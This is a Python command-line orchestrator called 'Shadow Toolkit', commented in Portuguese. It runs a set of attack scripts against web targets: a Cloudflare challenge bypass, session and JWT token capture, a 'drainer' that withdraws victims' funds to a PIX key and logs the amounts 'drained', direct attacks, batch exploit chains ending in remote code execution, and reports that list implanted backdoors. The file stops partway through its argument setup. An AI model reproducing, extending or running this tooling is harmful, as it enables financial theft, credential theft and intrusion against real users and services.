#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Shadow Toolkit v2.1 — Orquestrador CLI para todos os scripts Sombra
Unifica: FlareSolverr, Shadow Pipeline, Token Hunter, Drainer, Relatórios
Version: 2.1
"""

import sys
import os
import json
import time
import subprocess
import socket
import argparse
import markdown
from pathlib import Path
from typing import Dict, Optional, List, Any
from datetime import datetime

SHADOW_DIR = Path(__file__).parent.parent.parent / "Shadow"
_suggested_paths = [
    Path(r"C:\Users\devel\Downloads\WorkClaude\Shadow"),
    Path(r"C:\Users\devel\Shadow"),
    Path.home() / "Shadow",
    Path.home() / ".shadow",
]
for _p in _suggested_paths:
    if _p.exists():
        SHADOW_DIR = _p
        break
SOMBRATTACK_DIR = SHADOW_DIR / "Sombrattack"
FLARESOLVERR_DIR = SOMBRATTACK_DIR / "FlareSolverr"

# Portas
FLARE_PORT = 8191
WEBUI_HTTP = 8765
WEBUI_WS = 8766


def is_port_in_use(port: int) -> bool:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(('127.0.0.1', port)) == 0


def _ensure_flaresolverr() -> bool:
    """Garante que FlareSolverr está rodando."""
    if is_port_in_use(FLARE_PORT):
        return True
    # Tenta iniciar automaticamente
    fs_dir = FLARESOLVERR_DIR / "src"
    if fs_dir.exists():
        env = os.environ.copy()
        env['PYTHONIOENCODING'] = 'utf-8'
        subprocess.Popen(
            [sys.executable, str(fs_dir / "flaresolverr.py"), "--port", str(FLARE_PORT)],
            cwd=str(fs_dir),
            env=env,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        time.sleep(2)
        return is_port_in_use(FLARE_PORT)
    return False


# ============================================================================
# Report Generator
# ============================================================================
class ReportGenerator:
    """Gera relatórios em Markdown a partir dos resultados."""

    @staticmethod
    def generate(
        target: str,
        results: Dict,
        output_path: Optional[Path] = None,
    ) -> str:
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        lines = [
            f"# Shadow Toolkit — Reporte de Operação",
            f"",
            f"- **Alvo:** `{target}`",
            f"- **Data:** {now}",
            f"- **Versão:** 2.0",
            f"",
            f"---",
            f"",
        ]

        # Summary
        summary = results.get("summary", {})
        lines.append("## Resumo")
        lines.append("")
        lines.append(f"- **Total de etapas:** {summary.get('total_steps', 0)}")
        lines.append(f"- **Sucessos:** {summary.get('successes', 0)}")
        lines.append(f"- **Falhas:** {summary.get('failures', 0)}")
        lines.append(f"- **Completação:** {summary.get('completion_pct', 0)}%")
        lines.append(f"- **Duração:** {summary.get('duration_sec', 0)}s")
        if summary.get("rollback_triggered"):
            lines.append(f"- **Rollback:** ⚠️ Acionado")
        lines.append("")

        # Steps detail
        lines.append("## Etapas")
        lines.append("")
        lines.append("| # | Tipo | Ação | Status | Duração |")
        lines.append("|---|------|------|--------|---------|")
        for step in results.get("steps", []):
            status = "✅" if step["success"] else "❌"
            lines.append(
                f"| {step.get('step_num', '?')} | {step['step']['type']} | "
                f"`{step['step']['action']}` | {status} | {step['duration']}s |"
            )
        lines.append("")

        # Context
        ctx = summary.get("context", {})
        if ctx.get("captured_tokens"):
            lines.append("## Tokens Capturados")
            lines.append("")
            for t in ctx["captured_tokens"][:10]:
                lines.append(f"- `{t[:80]}...`")
            lines.append("")

        if ctx.get("found_vulns"):
            lines.append("## Vulnerabilidades Encontradas")
            lines.append("")
            for v in ctx["found_vulns"][:10]:
                lines.append(f"- **{v.get('type', '?')}** em `{v.get('endpoint', '?')}`")
            lines.append("")

        if ctx.get("deployed_backdoors"):
            lines.append("## Backdoors Implantados")
            lines.append("")
            for b in ctx["deployed_backdoors"]:
                lines.append(f"- **{b.get('type', '?')}**: `{b.get('token', b.get('url', '?'))[:80]}`")
            lines.append("")

        if ctx.get("extracted_data"):
            lines.append("## Dados Extraindos")
            lines.append("")
            for k, v in list(ctx["extracted_data"].items())[:5]:
                lines.append(f"### `{k}`")
                lines.append(f"```")
                lines.append(str(v)[:500])
                lines.append("```")
            lines.append("")

        # End
        lines.append("---")
        lines.append(f"*Gerado por Shadow Toolkit v2.0 em {now}*")

        report = "\n".join(lines)

        if output_path:
            output_path.parent.mkdir(parents=True, exist_ok=True)
            with open(output_path, "w", encoding="utf-8") as f:
                f.write(report)
            print(f"[+] Report saved: {output_path}")

        return report


# ============================================================================
# Batch Target Processor
# ============================================================================
class BatchProcessor:
    """Processa múltiplos alvos em sequência."""

    def __init__(self, orchestrator_class):
        self.orchestrator_class = orchestrator_class

    def run_batch(
        self,
        targets: List[str],
        chain_name: str,
        headers: Optional[Dict] = None,
        report_dir: Optional[Path] = None,
        json_output: bool = False,
    ) -> List[Dict]:
        results = []
        for i, target in enumerate(targets, 1):
            print(f"\n{'='*60}")
            print(f"  BATCH [{i}/{len(targets)}]: {target}")
            print(f"{'='*60}")

            orch = self.orchestrator_class(target, headers)
            result = orch.run_chain(chain_name, verbose=True)
            results.append(result)

            # Auto-generate report
            if report_dir:
                report_path = report_dir / f"report_{int(time.time())}_{i}.md"
                ReportGenerator.generate(target, result, output_path=report_path)

        # Summary
        total = len(results)
        full_success = sum(1 for r in results if r["summary"]["successes"] == r["summary"]["total_steps"])
        partial = total - full_success
        print(f"\n{'='*60}")
        print(f"  BATCH COMPLETE: {total} targets")
        print(f"  Full success: {full_success}")
        print(f"  Partial: {partial}")
        print(f"{'='*60}")

        return results


# ============================================================================
# Command Handlers
# ============================================================================
def cmd_status(args):
    """Mostra status de todos os serviços"""
    print("=" * 50)
    print("  SHADOW TOOLKIT v2 — STATUS")
    print("=" * 50)

    services = {
        "FlareSolverr": FLARE_PORT,
        "Shadow WebUI": WEBUI_HTTP,
        "Shadow WebSocket": WEBUI_WS,
    }

    for name, port in services.items():
        status = "ON" if is_port_in_use(port) else "OFF"
        icon = "[+]" if status == "ON" else "[-]"
        print(f"  {icon} {name:20s} :{port} [{status}]")

    # Check scripts exist
    scripts = {
        "sombra_activate.py": SHADOW_DIR / "sombra_activate.py",
        "shadow_attack_gui.py": SOMBRATTACK_DIR / "shadow_attack_gui.py",
        "webui.py": SOMBRATTACK_DIR / "webui.py",
        "pix_validator.py": SOMBRATTACK_DIR / "pix_validator.py",
    }
    print()
    print("  Scripts:")
    for name, path in scripts.items():
        exists = "[+]" if path.exists() else "[-]"
        print(f"  {exists} {name}")

    # Check tools directory
    tools_dir = Path(__file__).parent.parent
    if tools_dir.exists():
        py_files = list(tools_dir.glob("*.py"))
        print(f"\n  Tools scripts: {len(py_files)}")
        # Also check subdirectories
        for subdir in tools_dir.iterdir():
            if subdir.is_dir() and (subdir / "__init__.py").exists():
                print(f"  [+] Package: {subdir.name}/")

    print()
    print("=" * 50)


def cmd_flare(args):
    """Comando flare — Cloudflare bypass"""
    subcmd = args.flare_subcommand if hasattr(args, 'flare_subcommand') else None

    if subcmd == 'start':
        print("[*] Starting FlareSolverr...")
        if is_port_in_use(FLARE_PORT):
            print(f"[!] FlareSolverr already running on port {FLARE_PORT}")
            return
        _ensure_flaresolverr()
        if is_port_in_use(FLARE_PORT):
            print(f"[+] FlareSolverr started on port {FLARE_PORT}")
            print(f"[+] API: http://127.0.0.1:{FLARE_PORT}/v1")
        else:
            print("[-] Failed to start FlareSolverr")

    elif subcmd == 'stop':
        result = subprocess.run(
            ['netstat', '-ano'], capture_output=True, text=True, timeout=5
        )
        for line in result.stdout.split('\n'):
            if f':{FLARE_PORT}' in line and 'LISTENING' in line:
                parts = line.strip().split()
                if parts:
                    pid = parts[-1]
                    try:
                        os.kill(int(pid), 9)
                        print(f"[+] FlareSolverr killed (PID: {pid})")
                    except Exception:
                        print(f"[!] Failed to kill PID {pid}")
                    break
        else:
            print(f"[!] No FlareSolverr process found on port {FLARE_PORT}")

    elif subcmd == 'status':
        if is_port_in_use(FLARE_PORT):
            print(f"[+] FlareSolverr running on port {FLARE_PORT}")
            try:
                import urllib.request
                resp = urllib.request.urlopen(f"http://127.0.0.1:{FLARE_PORT}/v1", timeout=3)
                data = json.loads(resp.read())
                print(f"[+] Response: {json.dumps(data, indent=2)}")
            except Exception as e:
                print(f"[!] Error checking API: {e}")
        else:
            print(f"[-] FlareSolverr not running on port {FLARE_PORT}")

    elif subcmd == 'solve':
        url = args.url
        if not url:
            print("[!] Usage: /shadow flare solve <url>")
            return
        if not _ensure_flaresolverr():
            print("[!] Failed to start FlareSolverr")
            return
        import urllib.request
        payload = json.dumps({
            "cmd": "request.get",
            "url": url,
            "maxTimeout": 60
        }).encode()
        req = urllib.request.Request(
            f"http://127.0.0.1:{FLARE_PORT}/v1",
            data=payload,
            headers={'Content-Type': 'application/json'}
        )
        try:
            resp = urllib.request.urlopen(req, timeout=90)
            data = json.loads(resp.read())
            if data.get('solution'):
                sol = data['solution']
                print(f"\n[+] Title: {sol.get('title', 'N/A')}")
                print(f"[+] URL: {sol.get('url', url)}")
                cookies = sol.get('cookies', [])
                if cookies:
                    cookie_str = '; '.join(f"{c['name']}={c['value']}" for c in cookies)
                    print(f"[+] Cookies: {cookie_str[:200]}...")
                print(f"[+] Response: {len(sol.get('response', ''))} chars")
            else:
                print(f"[-] Failed: {data}")
        except Exception as e:
            print(f"[!] Error: {e}")

    elif subcmd == 'test':
        url = args.url
        if not url:
            print("[!] Usage: /shadow flare test <url>")
            return
        print(f"[*] Testing access to {url}...")
        try:
            import urllib.request
            resp = urllib.request.urlopen(url, timeout=10)
            print(f"[+] Status: {resp.status}")
            print(f"[+] Length: {len(resp.read())} bytes")
            print(f"[+] No Cloudflare challenge detected!")
        except urllib.error.HTTPError as e:
            print(f"[-] HTTP Error: {e.code}")
        except Exception as e:
            print(f"[-] Error: {e}")


def cmd_pipeline(args):
    """Comando pipeline — executa sombra_activate.py"""
    subcmd = args.pipeline_subcommand if hasattr(args, 'pipeline_subcommand') else None
    target = args.target if hasattr(args, 'target') and args.target else None

    script = SHADOW_DIR / "sombra_activate.py"
    if not script.exists():
        print(f"[!] Script not found: {script}")
        return

    if subcmd == 'run' and target:
        cmd = [sys.executable, str(script), "--target", target]
        if hasattr(args, 'token') and args.token:
            cmd.extend(["--token", args.token])
        if hasattr(args, 'max_withdraw') and args.max_withdraw:
            cmd.extend(["--max-withdraw", str(args.max_withdraw)])
        print(f"[*] Running pipeline: {' '.join(cmd)}")
        env = os.environ.copy()
        env['PYTHONIOENCODING'] = 'utf-8'
        proc = subprocess.Popen(cmd, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in proc.stdout:
            print(line, end='')
        proc.wait()

    elif subcmd == 'recon' and target:
        cmd = [sys.executable, str(script), "--target", target, "--recon-only"]
        print(f"[*] Running recon: {' '.join(cmd)}")
        env = os.environ.copy()
        env['PYTHONIOENCODING'] = 'utf-8'
        proc = subprocess.Popen(cmd, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in proc.stdout:
            print(line, end='')
        proc.wait()

    else:
        print(f"""
Shadow Pipeline — Executa o pipeline completo Sombra v4.0

Uso:
  /shadow pipeline run <target> [--token token.json] [--max-withdraw 1000]
  /shadow pipeline recon <target>
  /shadow pipeline status
        """)


def cmd_token(args):
    """Comando token — Token Hunter + Advanced extraction"""
    subcmd = args.token_subcommand if hasattr(args, 'token_subcommand') else None
    target = args.token_target if hasattr(args, 'token_target') and args.token_target else None

    script = SHADOW_DIR / "sombra_token_hunter_v6.py"
    if not script.exists():
        print(f"[!] Token Hunter script not found: {script}")
        hunters = list(SHADOW_DIR.glob("sombra_token_hunter_*.py"))
        if hunters:
            script = sorted(hunters)[-1]
            print(f"[+] Using: {script.name}")
        else:
            print("[!] No token hunter scripts found")
            return

    if subcmd == 'hunt' and target:
        cmd = [sys.executable, str(script), "--target", target]
        if hasattr(args, 'email') and args.email:
            cmd.extend(["--email", args.email])
        if hasattr(args, 'password') and args.password:
            cmd.extend(["--password", args.password])
        print(f"[*] Running token hunt: {' '.join(cmd)}")
        env = os.environ.copy()
        env['PYTHONIOENCODING'] = 'utf-8'
        proc = subprocess.Popen(cmd, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in proc.stdout:
            print(line, end='')
        proc.wait()

    elif subcmd == 'analyze' and hasattr(args, 'token') and args.token:
        import base64
        try:
            parts = args.token.split('.')
            if len(parts) == 3:
                header = base64.urlsafe_b64decode(parts[0] + '==').decode('utf-8', errors='replace')
                payload = base64.urlsafe_b64decode(parts[1] + '==').decode('utf-8', errors='replace')
                print(f"[+] JWT Header:\n  {json.dumps(json.loads(header), indent=2)}")
                print(f"[+] JWT Payload:\n  {json.dumps(json.loads(payload), indent=2)}")
                print(f"\n[+] Signature: {parts[2]}")
                print(f"[+] Alg: {json.loads(header).get('alg', 'N/A')}")
            else:
                print("[-] Invalid JWT format (need 3 parts)")
        except Exception as e:
            print(f"[-] Error analyzing JWT: {e}")

    elif subcmd == 'extract' and hasattr(args, 'url') and args.url:
        """Advanced token extraction from page source."""
        print(f"[*] Extracting tokens from {args.url}...")
        try:
            import urllib.request
            import re
            resp = urllib.request.urlopen(args.url, timeout=15)
            html = resp.read().decode('utf-8', errors='replace')

            token_patterns = [
                (r'"(token)"\s*:\s*"([a-zA-Z0-9._-]+)"', "JSON token"),
                (r'"(jwt)"\s*:\s*"([a-zA-Z0-9._-]+)"', "JSON JWT"),
                (r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', "JWT raw"),
                (r'(?:authorization|Authorization)\s*:\s*Bearer\s+([a-zA-Z0-9._-]+)', "Bearer token"),
                (r'(?:session|sessionId|sess_id)\s*=\s*([a-zA-Z0-9_-]+)', "Session cookie"),
            ]

            found = []
            for pattern, label in token_patterns:
                matches = re.findall(pattern, html)
                for m in (matches if isinstance(matches[0], str) else [x[1] for x in matches]):
                    if m not in found:
                        found.append(m)
                        print(f"  [{label}] {m[:80]}...")

            print(f"\n[+] Total tokens found: {len(found)}")
        except Exception as e:
            print(f"[-] Error: {e}")

    elif subcmd == 'list':
        saves = sorted(SHADOW_DIR.glob("sombra_autosave_*.json"), key=lambda p: p.stat().st_mtime, reverse=True)
        if saves:
            print(f"[+] Found {len(saves)} saved sessions")
            for s in saves[:5]:
                try:
                    with open(s) as f:
                        data = json.load(f)
                    tokens = len(data.get('tokens', []))
                    print(f"  {s.name}: {tokens} tokens, {len(data.get('vulnerabilities', []))} vulns")
                except Exception:
                    print(f"  {s.name}: (unreadable)")
        else:
            print("[-] No saved sessions found")

    else:
        print(f"""
Token Hunter — Captura e análise de tokens JWT

Uso:
  /shadow token hunt <url> [--email <e>] [--password <p>]
  /shadow token analyze <jwt_token>
  /shadow token extract <url>
  /shadow token list

Comandos:
  hunt     Captura tokens via browser automation
  analyze  Analisa estrutura JWT
  extract  Extrai tokens da fonte da página
  list     Lista sessões salvas
        """)


def cmd_drainer(args):
    """Comando drainer — Extração de fundos"""
    subcmd = args.drainer_subcommand if hasattr(args, 'drainer_subcommand') else None
    target = args.drainer_target if hasattr(args, 'drainer_target') and args.drainer_target else None

    drainers = list(SHADOW_DIR.glob("sombra_global_drainer*.py"))
    if not drainers:
        drainers = list(SHADOW_DIR.glob("sombra_drainer_v*.py"))
    if not drainers:
        print("[!] No drainer scripts found")
        return
    script = sorted(drainers)[-1]

    if subcmd == 'run' and target:
        cmd = [sys.executable, str(script), "--target", target]
        if hasattr(args, 'token') and args.token:
            cmd.extend(["--token", args.token])
        if hasattr(args, 'pix') and args.pix:
            cmd.extend(["--pix", args.pix])
        print(f"[*] Running drainer: {' '.join(cmd)}")
        env = os.environ.copy()
        env['PYTHONIOENCODING'] = 'utf-8'
        proc = subprocess.Popen(cmd, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in proc.stdout:
            print(line, end='')
        proc.wait()

    elif subcmd == 'status':
        saves = sorted(SHADOW_DIR.glob("sombra_autosave_*.json"), key=lambda p: p.stat().st_mtime, reverse=True)
        total_drained = 0
        if saves:
            with open(saves[0]) as f:
                data = json.load(f)
            balances = data.get('balances', [])
            withdrawals = data.get('withdrawals', [])
            total_drained = sum(w.get('amount', 0) for w in withdrawals)
            print(f"[+] Total drained: R$ {total_drained:.2f}")
            print(f"[+] Withdrawals: {len(withdrawals)}")
            print(f"[+] Balances tracked: {len(balances)}")
        else:
            print("[-] No data found")

    elif subcmd == 'logs':
        saves = sorted(SHADOW_DIR.glob("sombra_autosave_*.json"), key=lambda p: p.stat().st_mtime, reverse=True)
        if saves:
            with open(saves[0]) as f:
                data = json.load(f)
            withdrawals = data.get('withdrawals', [])
            print(f"\n[+] Last {min(len(withdrawals), 20)} withdrawals:")
            for w in withdrawals[-20:]:
                print(f"  [{w.get('timestamp', '?')}] R${w.get('amount', 0):.2f} -> {w.get('pix_key', '?')}")
        else:
            print("[-] No logs found")

    else:
        print(f"""
Drainer — Extração automática de fundos

Uso:
  /shadow drainer run <target> --token <token> --pix <chave>
  /shadow drainer status
  /shadow drainer logs
        """)


def cmd_attack(args):
    """Comando attack — GUI / WebUI / Direct"""
    subcmd = args.attack_subcommand if hasattr(args, 'attack_subcommand') else None

    if subcmd == 'gui':
        gui_script = SOMBRATTACK_DIR / "shadow_attack_gui.py"
        if gui_script.exists():
            print(f"[*] Starting Shadow Attack GUI...")
            env = os.environ.copy()
            env['PYTHONIOENCODING'] = 'utf-8'
            subprocess.Popen(
                [sys.executable, str(gui_script)],
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            print("[+] GUI opened")
        else:
            print(f"[!] GUI script not found: {gui_script}")

    elif subcmd == 'webui':
        launcher_script = SOMBRATTACK_DIR / "start_shadow.py"
        if launcher_script.exists():
            print(f"[*] Starting Shadow WebUI (ports 8765/8766)...")
            env = os.environ.copy()
            env['PYTHONIOENCODING'] = 'utf-8'
            subprocess.Popen(
                [sys.executable, str(launcher_script)],
                env=env,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )
            print(f"[+] WebUI starting at http://localhost:{WEBUI_HTTP}")
        else:
            webui_script = SOMBRATTACK_DIR / "webui.py"
            if webui_script.exists():
                subprocess.Popen(
                    [sys.executable, str(webui_script)],
                    env=os.environ.copy(),
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                )
                print(f"[+] WebUI starting at http://localhost:{WEBUI_HTTP}")
            else:
                print("[!] WebUI scripts not found")

    elif subcmd == 'pix' and hasattr(args, 'pix_key') and args.pix_key:
        pix_script = SOMBRATTACK_DIR / "pix_validator.py"
        if pix_script.exists():
            cmd = [sys.executable, str(pix_script), "--validate", args.pix_key]
            env = os.environ.copy()
            env['PYTHONIOENCODING'] = 'utf-8'
            proc = subprocess.Popen(cmd, env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in proc.stdout:
                print(line, end='')
            proc.wait()
        else:
            print("[!] pix_validator.py not found")

    elif subcmd == 'direct' and hasattr(args, 'url') and args.url:
        attack_script = SHADOW_DIR / "attack.py"
        if attack_script.exists():
            print(f"[*] Running direct attack against {args.url}")
            env = os.environ.copy()
            env['PYTHONIOENCODING'] = 'utf-8'
            proc = subprocess.Popen(
                [sys.executable, str(attack_script)],
                env=env,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )
            for line in proc.stdout:
                print(line, end='')
            proc.wait()
        else:
            print("[!] attack.py not found")

    else:
        print(f"""
Shadow Attack — GUI / WebUI / Direct

Uso:
  /shadow attack gui                # Abre GUI tkinter
  /shadow attack webui              # Inicia dashboard web (localhost:8765)
  /shadow attack pix <chave>        # Valida chave PIX
  /shadow attack direct <url>       # Ataque direto
        """)


def cmd_recon(args):
    """Comando recon — Reconhecimento avançado"""
    subcmd = args.recon_subcommand if hasattr(args, 'recon_subcommand') else None
    target = args.recon_target if hasattr(args, 'recon_target') and args.recon_target else None

    if subcmd == 'js-endpoints' and target:
        print(f"[*] Extracting endpoints from JS bundles at {target}...")
        try:
            import urllib.request
            import re
            resp = urllib.request.urlopen(target, timeout=15)
            html = resp.read().decode('utf-8', errors='replace')
            js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', html)
            endpoints = set()
            from urllib.parse import urljoin
            for js in js_urls[:10]:
                if js.startswith('//'):
                    js = 'https:' + js
                elif js.startswith('/'):
                    js = urljoin(target, js)
                try:
                    js_resp = urllib.request.urlopen(js, timeout=10)
                    js_content = js_resp.read().decode('utf-8', errors='replace')
                    api_paths = re.findall(r'["\'](\/api\/[^"\']{3,})["\']', js_content)
                    api_paths += re.findall(r'["\'](\/v\d\/[^"\']{3,})["\']', js_content)
                    api_paths += re.findall(r'["\'](https?://[^"\']+api[^"\']+)["\']', js_content)
                    endpoints.update(api_paths)
                except Exception:
                    pass
            if endpoints:
                print(f"[+] Found {len(endpoints)} API endpoints:")
                for ep in sorted(endpoints)[:50]:
                    print(f"  • {ep}")
            else:
                print("[-] No endpoints found in JS bundles")
        except Exception as e:
            print(f"[-] Error: {e}")

    elif subcmd == 'subdomains' and target:
        domain = target.replace('https://', '').replace('http://', '').split('/')[0]
        print(f"[*] Enumerating subdomains for {domain}...")
        try:
            import urllib.request
            resp = urllib.request.urlopen(f"https://crt.sh/?q=%.{domain}&output=json", timeout=30)
            results = json.loads(resp.read())
            subs = set()
            for r in results:
                name = r.get('name_value', '')
                for sub in name.split('\n'):
                    sub = sub.strip()
                    if sub and sub != domain:
                        subs.add(sub)
            print(f"[+] Found {len(subs)} subdomains:")
            for s in sorted(subs)[:100]:
                print(f"  • {s}")
        except Exception as e:
            print(f"[-] Error: {e}")

    elif subcmd == 'tech-stack' and target:
        print(f"[*] Analyzing tech stack at {target}...")
        try:
            import urllib.request
            resp = urllib.request.urlopen(target, timeout=15)
            html = resp.read().decode('utf-8', errors='replace')
            headers = dict(resp.headers)

            techs = []
            if 'server' in headers:
                techs.append(f"Server: {headers['server']}")
            if 'x-powered-by' in headers:
                techs.append(f"X-Powered-By: {headers['x-powered-by']}")
            if 'strict-transport-security' in headers:
                techs.append("HTTPS (HSTS)")
            if 'x-frame-options' in headers:
                techs.append("X-Frame-Options set")

            checks = [
                ('wp-content', 'WordPress'), ('react-dom', 'React'),
                ('angular', 'Angular'), ('vue' , 'Vue.js'),
                ('next.js', 'Next.js'), ('bootstrap', 'Bootstrap'),
                ('cloudflare', 'Cloudflare'), ('amazonaws', 'AWS'),
            ]
            for check, name in checks:
                if check in html.lower():
                    techs.append(name)

            if techs:
                print(f"[+] Technologies detected:")
                for t in techs:
                    print(f"  • {t}")
            else:
                print("[-] No specific technologies detected")
        except Exception as e:
            print(f"[-] Error: {e}")

    else:
        print(f"""
Recon — Reconhecimento avançado

Uso:
  /shadow recon js-endpoints <url>
  /shadow recon subdomains <domain>
  /shadow recon tech-stack <url>
        """)


def cmd_report(args):
    """Comando report — Gera relatório Markdown"""
    subcmd = args.report_subcommand if hasattr(args, 'report_subcommand') else None

    if subcmd == 'generate' and hasattr(args, 'target') and args.target:
        # Check for existing results
        saves = list(SHADOW_DIR.glob("sombra_autosave_*.json"))
        if saves:
            with open(sorted(saves)[-1]) as f:
                data = json.load(f)
            result = {
                "summary": {
                    "total_steps": len(data.get("steps", [])),
                    "successes": len([s for s in data.get("steps", []) if s.get("success")]),
                    "failures": len([s for s in data.get("steps", []) if not s.get("success")]),
                    "completion_pct": 0,
                    "duration_sec": 0,
                    "context": data,
                },
                "steps": data.get("steps", []),
            }
            out = Path(f"shadow_report_{int(time.time())}.md")
            report = ReportGenerator.generate(args.target, result, output_path=out)
            print(report)
        else:
            print("[-] No saved results found. Run a pipeline first.")

    elif subcmd == 'from-file' and hasattr(args, 'input') and args.input:
        try:
            with open(args.input) as f:
                data = json.load(f)
            target = data.get("target", "unknown")
            out = Path(f"shadow_report_{int(time.time())}.md")
            report = ReportGenerator.generate(target, data, output_path=out)
            print(report)
        except Exception as e:
            print(f"[-] Error: {e}")

    else:
        print(f"""
Report — Gera relatórios em Markdown

Uso:
  /shadow report generate <target>
  /shadow report from-file <result.json>
        """)


def cmd_batch(args):
    """Comando batch — Processa múltiplos alvos"""
    subcmd = args.batch_subcommand if hasattr(args, 'batch_subcommand') else None
    targets_input = args.batch_targets if hasattr(args, 'batch_targets') and args.batch_targets else None

    if subcmd == 'run' and targets_input:
        # Parse targets (comma-separated or file)
        if targets_input.endswith('.txt'):
            with open(targets_input) as f:
                targets = [line.strip() for line in f if line.strip()]
        else:
            targets = [t.strip() for t in targets_input.split(',')]

        if not targets:
            print("[-] No targets found")
            return

        print(f"[*] Processing {len(targets)} targets...")

        from exploit_chain.exploit_chain import ExploitChainOrchestrator
        headers = {}
        if hasattr(args, 'header') and args.header:
            for h in args.header:
                if ":" in h:
                    k, v = h.split(":", 1)
                    headers[k.strip()] = v.strip()

        processor = BatchProcessor(ExploitChainOrchestrator)
        report_dir = Path("shadow_reports")
        results = processor.run_batch(
            targets=targets,
            chain_name=args.chain if hasattr(args, 'chain') and args.chain else "web_recon_to_rce",
            headers=headers,
            report_dir=report_dir,
            json_output=getattr(args, 'json', False),
        )

    else:
        print(f"""
Batch — Processa múltiplos alvos

Uso:
  /shadow batch run <target1,target2,...> [--chain web_recon_to_rce] [--header key:value]
  /shadow batch run targets.txt [--chain jwt_chain]
        """)


def cmd_config(args):
    """Comando config — Configuração"""
    subcmd = args.config_subcommand if hasattr(args, 'config_subcommand') else None

    config_file = SHADOW_DIR / "shadow_config.json"
    config = {}
    if config_file.exists():
        try:
            with open(config_file) as f:
                config = json.load(f)
        except Exception:
            config = {}

    if subcmd == 'set':
        key = args.config_key
        value = args.config_value
        config[key] = value
        with open(config_file, 'w') as f:
            json.dump(config, f, indent=2)
        print(f"[+] Config set: {key} = {value}")

    elif subcmd == 'show':
        print("\n[+] Current Configuration:")
        if config:
            for k, v in config.items():
                print(f"  {k}: {v}")
        else:
            print("  (no custom config)")
        print("""
Default values:
  proxy: None
  tor: false
  rate-limit: 0.2
  threads: 20
  discord-webhook: None
  max-withdraw: 500.00
        """)

    else:
        print(f"""
Config — Configuration management

Uso:
  /shadow config set <key> <value>
  /shadow config show
        """)


def main():
    parser = argparse.ArgumentParser(
        description='Shadow Toolkit v2 — Orquestrador Sombra',
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    subparsers = parser.add_subparsers(dest='command', help='Comando')

    # status
    sp = subparsers.add_parser('status', help='Status dos serviços')

    # flare
    flare_p = subparsers.add_parser('flare', help='Cloudflare bypass')
    flare_sp = flare_p.add_subparsers(dest='flare_subcommand')
    flare_sp.add_parser('start', help='Inicia FlareSolverr')
    flare_sp.add_parser('stop', help='Para FlareSolverr')
    flare_sp.add_parser('status', help='Status')
    fs = flare_sp.add_parser('solve', help='Resolve challenge')
    fs.add_argument('url', help='URL para resolver')
    ft = flare_sp.add_parser('test', help='Testa acesso')
    ft.add_argument('url', help='URL para testar')

    # pipeline
    pipe_p = subparsers.add_parser('pipeline', help='Pipeline de ataque')
    pipe_sp = pipe_p.add_subparsers(dest='pipeline_subcommand')
    pr = pipe_sp.add_parser('run', help='Executa pipeline completo')
    pr.add_argument('target', help='Target URL')
    pr.add_argument('--token', help='Token JSON file')
    pr.add_argument('--max-withdraw', type=float, help='Max withdrawal per user')
    pre = pipe_sp.add_parser('recon', help='Só reconhecimento')
    pre.add_argument('target', help='Target URL')

    # token
    tok_p = subparsers.add_parser('token', help='Token Hunter')
    tok_sp = tok_p.add_subparsers(dest='token_subcommand')
    th = tok_sp.add_parser('hunt', help='Captura tokens')
    th.add_argument('token_target', help='Target URL')
    th.add_argument('--email', help='Email for login')
    th.add_argument('--password', help='Password for login')
    ta = tok_sp.add_parser('analyze', help='Analisa JWT')
    ta.add_argument('token', help='JWT token')
    te = tok_sp.add_parser('extract', help='Extrai tokens da página')
    te.add_argument('url', help='Page URL')
    tok_sp.add_parser('list', help='Lista sessões')

    # drainer
    drain_p = subparsers.add_parser('drainer', help='Drainer System')
    drain_sp = drain_p.add_subparsers(dest='drainer_subcommand')
    dr = drain_sp.add_parser('run', help='Executa drainer')
    dr.add_argument('drainer_target', help='Target URL')
    dr.add_argument('--token', help='Token JSON file')
    dr.add_argument('--pix', help='PIX key for withdrawals')
    drain_sp.add_parser('status', help='Status')
    drain_sp.add_parser('logs', help='Logs')

    # attack
    atk_p = subparsers.add_parser('attack', help='Attack tools')
    atk_sp = atk_p.add_subparsers(dest='attack_subcommand')
    atk_sp.add_parser('gui', help='Abre GUI')
    atk_sp.add_parser('webui', help='Inicia WebUI')
    ap = atk_sp.add_parser('pix', help='Valida PIX')
    ap.add_argument('pix_key', help='PIX key')
    ad = atk_sp.add_parser('direct', help='Ataque direto')
    ad.add_argument('url', help='Target URL')

    # recon
    recon_p = subparsers.add_parser('recon', help='Reconhecimento')
    recon_sp = recon_p.add_subparsers(dest='recon_subcommand')
    rjs = recon_sp.add_parser('js-endpoints', help='JS endpoint extraction')
    rjs.add_argument('recon_target', help='Target URL')
    rs = recon_sp.add_parser('subdomains', help='Subdomain enum')
    rs.add_argument('recon_target', help='Domain')
    rt = recon_sp.add_parser('tech-stack', help='Tech stack analysis')
    rt.add_argument('recon_target', help='Target URL')

    # report
    rep_p = subparsers.add_parser('report', help='Generate reports')
    rep_sp = rep_p.add_subparsers(dest='report_subcommand')
    rg = rep_sp.add_parser('generate', help='Generate from latest run')
    rg.add_argument('target', help='Target URL')
    rf = rep_sp.add_parser('from-file', help='Generate from JSON file')
    rf.add_argument('input', help='Result JSON file')

    # batch
    bat_p = subparsers.add_parser('batch', help='Multi-target processing')
    bat_sp = bat_p.add_subparsers(dest='batch_subcommand')
    br = bat_sp.add_parser('run', help='Run batch')
    br.add_argument('batch_targets', help='Comma-separated targets or .txt file')
